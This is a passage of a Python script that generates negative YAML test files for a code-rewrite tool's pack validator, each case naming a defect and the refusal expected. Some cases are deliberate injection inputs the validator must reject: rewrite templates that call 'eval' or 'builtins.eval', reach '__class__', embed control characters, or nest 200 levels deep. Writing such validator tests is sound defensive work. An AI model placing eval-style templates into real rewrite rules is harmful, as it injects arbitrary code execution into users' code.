        extra=MEMBER_CHANGE,
        mutate=_member(legacy=["demo_legacy.configure"], members={"demo_legacy.Model.old": "new"}),
    ),
    Case(
        name="a_member_under_a_refused_prefix",
        defect="a member of a class a flag_only rule reports, which the scan grades first",
        path="",
        says="is under a symbol a flag_only rule refuses",
        extra=MEMBER_CHANGE,
        mutate=_member_of_a_refused_class,
    ),
    Case(
        name="a_member_both_renamed_and_refused",
        defect="a member renamed by one rule and reported by another",
        path="",
        says="is both rewritten and refused",
        extra=MEMBER_CHANGE,
        mutate=_member(
            members={"demo_legacy.Model.old": "new"},
            more=(
                {
                    **FLAG_CHANGE,
                    "id": "flag-old",
                    "params": {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.Model.old"]},
                },
            ),
        ),
    ),
    Case(
        name="a_takes_entry_for_a_member_the_rule_does_not_rename",
        defect="a keyword list for a member nothing renames, so no call is ever checked against it",
        path=f"{EXTRA}.params",
        says="is not a member in members, so no call is checked",
        extra=MEMBER_CHANGE,
        mutate=_member(
            members={"demo_legacy.Model.old": "new"}, takes={"demo_legacy.Model.other": ["a"]}
        ),
    ),
    Case(
        name="a_takes_entry_that_is_not_sorted",
        defect="a keyword list in an order a reader cannot check",
        path=f"{EXTRA}.params",
        says="must be sorted and de-duplicated",
        extra=MEMBER_CHANGE,
        mutate=_member(
            members={"demo_legacy.Model.old": "new"}, takes={"demo_legacy.Model.old": ["b", "a"]}
        ),
    ),
    Case(
        name="two_changes_that_claim_one_member",
        defect="two rules on one member, so the order of the list would pick",
        path="",
        says="two changes claim 'demo_legacy.Model.old'",
        extra=MEMBER_CHANGE,
        mutate=_member(
            members={"demo_legacy.Model.old": "new"},
            more=(
                {
                    **MEMBER_CHANGE,
                    "id": "again",
                    "params": {"members": {"demo_legacy.Model.old": "newer"}},
                },
            ),
        ),
    ),
    # rewrite_pattern: a call of a name, rewritten from the shape of its arguments.
    Case(
        name="a_pattern_that_is_no_call",
        defect="a template that is a name, which has no arguments to take the shape of",
        path=f"{EXTRA}.params",
        says="before is no call; a pattern is a call of a name",
        extra=PATTERN_CHANGE,
        mutate=_pattern(before="demo_legacy.old"),
    ),
    Case(
        name="a_pattern_template_that_does_not_parse",
        defect="a template that is not an expression",
        path=f"{EXTRA}.params.before",
        says="before does not parse",
        extra=PATTERN_CHANGE,
        mutate=_pattern(before="demo_legacy.old("),
    ),
    Case(
        name="a_pattern_template_with_a_form_a_template_cannot_hold",
        defect="a template with a lambda, which a call cannot be compared with by form",
        path=f"{EXTRA}.params.after",
        says="after holds a Lambda",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_legacy.new(lambda: $a)"),
    ),
    Case(
        name="a_pattern_template_that_is_too_long",
        defect="a template that is a program",
        path=f"{EXTRA}.params.before",
        says="over the 2000 a template may be",
        extra=PATTERN_CHANGE,
        mutate=_pattern(before="demo_legacy.old(" + "x, " * 700 + "$a)"),
    ),
    Case(
        name="a_pattern_template_with_a_control_character",
        defect="a template that spans lines or moves a terminal",
        path=f"{EXTRA}.params.after",
        says="must not carry a control, format or surrogate character",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_legacy.new(\n$a)"),
    ),
    Case(
        name="a_pattern_that_builds_with_a_metavariable_it_never_bound",
        defect="a new expression that reads an expression the old one did not hold",
        path=f"{EXTRA}.params",
        says="after uses $b, which before does not bind",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_legacy.new($a, $b)"),
    ),
    Case(
        name="a_pattern_that_names_a_class_for_nothing",
        defect="a `where` entry for a metavariable no member call is made on",
        path=f"{EXTRA}.params",
        says="where names ['a']",
        extra=PATTERN_CHANGE,
        mutate=_pattern(where={"a": "demo_legacy.Model"}),
    ),
    Case(
        name="a_pattern_member_call_with_no_class",
        defect="a member call of a metavariable whose class nothing says",
        path=f"{EXTRA}.params",
        says="whose class `where` does not name",
        extra=PATTERN_CHANGE,
        mutate=_pattern(before="$m.old($a)", after="$m.new($a)"),
    ),
    Case(
        name="a_pattern_that_calls_something_that_is_not_a_qualified_name",
        defect="a call of a bare name, which no import says where it is from",
        path=f"{EXTRA}.params",
        says="calls something that is not a qualified name",
        extra=PATTERN_CHANGE,
        mutate=_pattern(before="old($a)"),
    ),
    Case(
        name="a_pattern_that_spells_a_name_nothing_imports",
        defect="a new expression with a name from another module, which no import writes",
        path=f"{EXTRA}.params",
        says="a name nothing imports",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="other_lib.new($a)"),
    ),
    Case(
        name="a_pattern_import_that_after_never_spells",
        defect="a path listed as importable that no name of the new expression is under",
        path=f"{EXTRA}.params",
        says="imports lists demo_other, which after spells no name under",
        extra=PATTERN_CHANGE,
        mutate=_pattern(imports=["demo_other"]),
    ),
    Case(
        name="a_pattern_import_of_the_builtins",
        defect="a module that is the names a template may not spell, reached by its path",
        path=f"{EXTRA}.params",
        says="imports lists builtins",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="builtins.eval($a)", imports=["builtins"]),
    ),
    Case(
        name="a_pattern_import_list_that_is_not_sorted",
        defect="a list of paths with two spellings of one set",
        path=f"{EXTRA}.params",
        says="imports must be sorted and de-duplicated",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_b.new(demo_a.size($a))", imports=["demo_b", "demo_a"]),
    ),
    Case(
        name="a_pattern_import_that_lands_on_a_legacy_name",
        defect="a name under an importable path that `symbols` lists, so the result is found again",
        path="",
        says="which match.symbols lists as legacy",
        extra=PATTERN_CHANGE,
        mutate=_pattern_through_a_legacy_module,
    ),
    Case(
        name="a_pattern_that_builds_with_the_name_it_is_found_by",
        defect="a new expression that calls the old name, so the result is found again",
        path=f"{EXTRA}.params",
        says="the name before is found by",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_legacy.old($a)"),
    ),
    Case(
        name="a_pattern_that_builds_a_name_the_scan_lists_as_legacy",
        defect="a new name that `symbols` lists, so the rewritten call is a finding again",
        path="",
        says="which match.symbols lists as legacy",
        extra=PATTERN_CHANGE,
        mutate=_pattern(
            legacy=["demo_legacy.configure", "demo_legacy.new", "demo_legacy.old"],
        ),
    ),
    Case(
        name="a_pattern_for_a_name_outside_the_listed_legacy_names",
        defect="a called name the module's name reaches but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
        extra=PATTERN_CHANGE,
        mutate=_pattern(legacy=["demo_legacy.configure"]),
    ),
    Case(
        name="a_pattern_that_reads_the_member_it_is_found_by",
        defect="a new expression that still calls the member, so the rewritten call is found again",
        path=f"{EXTRA}.params",
        says="the member before is found by",
        extra=PATTERN_CHANGE,
        mutate=_pattern(
            legacy=["demo_legacy.Model.old", "demo_legacy.configure"],
            before="$m.old($a)",
            after="$m.old(1, $a)",
            where={"m": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="a_pattern_that_builds_a_member_the_scan_lists_as_legacy",
        defect="a new member that `symbols` lists on the class, so the result is a finding again",
        path="",
        says="which match.symbols lists as legacy",
        extra=PATTERN_CHANGE,
        mutate=_pattern(
            legacy=[
                "demo_legacy.Model.new",
                "demo_legacy.Model.old",
                "demo_legacy.configure",
            ],
            before="$m.old($a)",
            after="$m.new($a)",
            where={"m": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="a_pattern_for_a_member_under_a_refused_prefix",
        defect="a member of a class a flag_only rule reports, which the scan grades first",
        path="",
        says="is under a symbol a flag_only rule refuses",
        extra=PATTERN_CHANGE,
        mutate=_pattern_of_a_refused_class,
    ),
    Case(
        name="a_pattern_template_that_reaches_the_interpreter",
        defect="a template with a dunder name, which no pack of data may write",
        path=f"{EXTRA}.params.after",
        says="a name that reaches the interpreter",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="demo_legacy.new($a).__class__"),
    ),
    Case(
        name="a_pattern_that_spells_a_builtin_that_reaches_out",
        defect="a new expression that calls `eval`, which is no builtin that only builds a value",
        path=f"{EXTRA}.params",
        says="a name nothing imports",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="eval($a)"),
    ),
    Case(
        name="a_pattern_template_nested_too_deeply_to_read",
        defect="a template that overruns the reader, which must refuse it and not crash",
        path=f"{EXTRA}.params.after",
        says="nested too deeply",
        extra=PATTERN_CHANGE,
        mutate=_pattern(after="[" * 200 + "$a" + "]" * 200),
    ),
    Case(
        name="two_changes_that_claim_one_pattern_name",
        defect="two rules on one name, so the order of the list would pick",
        path="",
        says="two changes claim 'demo_legacy.old'",
        extra=PATTERN_CHANGE,
        mutate=_pattern(
            more=({**PATTERN_CHANGE, "id": "again", "params": {**PATTERN_CHANGE["params"]}},),
        ),
    ),
    Case(
        name="a_pattern_name_both_rewritten_and_refused",
        defect="a name rewritten by one rule and reported by another",
        path="",
        says="is both rewritten and refused",
        extra=PATTERN_CHANGE,
        mutate=_pattern(
            more=(
                {
                    **FLAG_CHANGE,
                    "id": "flag-old",
                    "params": {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.old"]},
                },
            ),
        ),
    ),
    # rewrite_call rooted on the module: where it is spelled, and what it reads of the result.
    Case(
        name="a_client_call_with_no_client_source",
        defect="a call rewritten onto a client that no rule constructs",
        path="",
        says="onto the client (['measure']); found 0",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"].pop(0),
    ),
    Case(
        name="a_rewrite_rooted_on_a_receiver",
        defect="a root only a method of a declared receiver has",
        path=f"{EXTRA}.params.root",
        says="Input should be 'client' or 'module'",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "root", "receiver"),
    ),
    Case(
        name="a_module_call_with_no_service_to_name_it_under",
        defect="a new call that is one name, which no module has a service called",
        path=f"{EXTRA}.params.new_call",
        says="names a service and a method on it",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "new_call", "run"),
    ),
    Case(
        name="a_result_path_that_ends_in_a_subscript",
        defect="a read of the result that stops at an element, which carries no attribute",
        path=f"{EXTRA}.params.result_paths[0]",
        says="got 'rows[]'",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "result_paths", ["rows[]"]),
    ),
    Case(
        name="a_result_path_that_starts_with_a_digit",
        defect="a read of the result through a name no attribute can have",
        path=f"{EXTRA}.params.result_paths[0]",
        says="got '2nd.price'",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "result_paths", ["2nd.price"]),
    ),
    Case(
        name="a_result_path_with_an_empty_segment",
        defect="a read of the result with a dot that names nothing",
        path=f"{EXTRA}.params.result_paths[0]",
        says="got 'rows..price'",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "result_paths", ["rows..price"]),
    ),
    Case(
        name="a_result_path_with_a_space",
        defect="a read of the result that is an expression rather than a path",
        path=f"{EXTRA}.params.result_paths[0]",
        says="got 'rows[].unit price'",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "result_paths", ["rows[].unit price"]),
    ),
    Case(
        name="a_result_path_that_continues_another",
        defect="two reads of the result where the shorter is trusted and the longer goes past it",
        path=f"{EXTRA}.params",
        says="result_paths names 'total' and 'total.amount' below it",
        extra=MODULE_CALL,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "result_paths", ["total", "total.amount"]
        ),
    ),
    Case(
        name="a_result_path_list_that_is_not_sorted",
        defect="a list of result paths with two spellings of one set",
        path=f"{EXTRA}.params",
        says="result_paths must be sorted and de-duplicated",
        extra=MODULE_CALL,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "result_paths", ["total", "rows[].price"]
        ),
    ),
    Case(
        name="result_paths_beside_result_access_flags",
        defect="a list of results reads that carry, next to a flag that refuses every read",
        path=f"{EXTRA}.params",
        says="would never be consulted",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "result_access_flags", ["usage"]),
    ),
    Case(
        name="a_keyword_list_that_is_not_sorted",
        defect="a list of keywords with two spellings of one set",
        path=f"{EXTRA}.params",
        says="keywords must be sorted and de-duplicated",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "keywords", ["depth", "body"]),
    ),
    Case(
        name="a_keyword_that_is_also_positional",
        defect="a parameter carried as a keyword and also by position, so the order decides",
        path=f"{EXTRA}.params",
        says="['kind'] is in keywords and also in positional_to_kw",
        extra=MODULE_CALL,
        mutate=lambda d: _with(d["changes"][1]["params"], "keywords", ["body", "depth", "kind"]),
    ),
    Case(
        name="a_keyword_that_is_also_a_config_field",
        defect="a parameter carried as a keyword and also into the configuration",
        path=f"{EXTRA}.params",
        says="['depth'] is in keywords and also in positional_to_kw or config_kwargs",
        extra=MODULE_CALL,
        mutate=_depth_is_also_a_config_field,
    ),
    Case(
        name="a_keyword_renamed_onto_a_positional_parameter",
        defect="a rename onto the name a positional parameter already carries",
        path=f"{EXTRA}.params",
        says="two entries of positional_to_kw and keywords land on ['kind']",
        extra=MODULE_CALL,
        mutate=lambda d: d["changes"][1]["params"]["arg_map"].update({"body": "kind"}),
    ),
    Case(
        name="a_keyword_renamed_onto_the_configuration_keyword",
        defect="a rename onto the name the configuration object is passed under",
        path=f"{EXTRA}.params",
        says="two entries of positional_to_kw and keywords land on ['text']",
        extra=MODULE_CALL,
        mutate=lambda d: d["changes"][1]["params"].update(
            {"config_class": "demo_legacy.Cfg", "config_kwargs": ["tone"], "config_kwarg": "text"}
        ),
    ),
    Case(
        name="not_a_mapping",
        defect="a sequence where a mapping of fields belongs",
        path="",
        says="and this one is a list",
        text="- id: demo/legacy-to-modern\n- pack_version: 0.1.0\n",
    ),
    Case(
        name="not_valid_yaml",
        defect="a document the parser cannot read at all",
        path="",
        says="line ",
        text="pack_version: 0.1.0\nid: [demo/legacy-to-modern\n",
    ),
    Case(
        name="only_comments",
        defect="a file with no document in it",
        path="",
        says="the file is empty",
        text="",
    ),
)


def _header(case: Case) -> str:
    where = f"`{case.path}`" if case.path else "the document as a whole"
    return (
        f"# Negative pack: {case.defect}.\n"
        f"#\n"
        f"# `obelize pack validate` must exit 7 on this file, and the refusal must\n"
        f"# name {where} and say {case.says!r}.\n"
        f"#\n"
        f"# Generated by tests/packs/_negative/_build.py -- do not edit by hand.\n"
    )


def document(case: Case) -> Document:
    built = copy.deepcopy(MINIMAL)
    if case.extra is not None:
        built["changes"].append(copy.deepcopy(case.extra))
    if case.mutate is not None:
        case.mutate(built)
    return built


def render(case: Case) -> bytes:
    """The exact bytes of one committed negative pack."""
    if case.text == "__DUPLICATE__":
        body = yaml.safe_dump(document(case), sort_keys=False, default_flow_style=False)
        body = body.replace("provider: demo\n", "provider: demo\nprovider: demo\n", 1)
    elif case.text is not None:
        body = case.text
    else:
        body = yaml.safe_dump(
            document(case), sort_keys=False, default_flow_style=False, allow_unicode=False
        )
    return (_header(case) + body).encode("utf-8")


def build() -> dict[str, bytes]:
    return {f"{case.name}.yaml": render(case) for case in CASES}


def verify(expected: dict[str, bytes]) -> bool:
    """Compare the committed files with `expected`; writes nothing."""
    ok = True
    on_disk = {path.name for path in HERE.glob("*.yaml")}
    for extra in sorted(on_disk - set(expected)):
        print(f"stale: {extra} is not produced by any case", file=sys.stderr)
        ok = False
    for name, data in expected.items():
        path = HERE / name
        current = path.read_bytes() if path.exists() else None
        if current != data:
            print(f"drift: {name}", file=sys.stderr)
            ok = False
    return ok


def main(argv: list[str] | None = None) -> int:
    arguments = list(sys.argv[1:] if argv is None else argv)
    expected = build()
    if arguments == ["--check"]:
        if verify(expected):
            print("CHECK: ok")
            return 0
        print("CHECK: the committed corpus is not what _build.py produces", file=sys.stderr)
        return 1
    if arguments:
        print(f"usage: _build.py [--check]; unknown argument {arguments[0]!r}", file=sys.stderr)
        return 2
    for name, data in expected.items():
        (HERE / name).write_bytes(data)
    print(f"wrote {len(expected)} negative packs to {HERE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
